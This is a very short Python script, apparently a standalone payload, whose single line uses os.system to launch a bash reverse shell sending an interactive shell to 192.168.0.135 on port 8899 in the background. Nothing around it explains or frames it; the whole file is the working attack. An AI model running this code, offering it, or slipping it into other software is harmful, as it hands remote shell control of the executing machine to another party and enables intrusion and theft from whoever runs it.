#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.135/8899 0>&1' &")
